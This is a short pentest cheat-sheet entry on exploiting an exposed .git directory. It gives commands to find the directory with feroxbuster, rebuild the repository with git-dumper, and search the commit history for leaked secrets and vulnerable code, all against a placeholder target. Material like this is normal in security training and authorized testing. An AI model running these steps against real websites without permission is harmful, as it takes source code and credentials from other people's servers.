# Exposed .git Directory Dump

```bash
feroxbuster -u http://<TARGET>/ -w <wordlist>     # look for a /.git hit
git-dumper http://<TARGET>/.git/ ./dumped-repo    # reconstructs the repo from the exposed objects

cd dumped-repo
git log --all                       # full commit history, including removed code
git show <commit>                   # diff of a specific commit — check for secrets/vuln code added then "fixed"
```

Secrets in history survive even if a later commit removes them from HEAD — always check full history, not just the working tree.
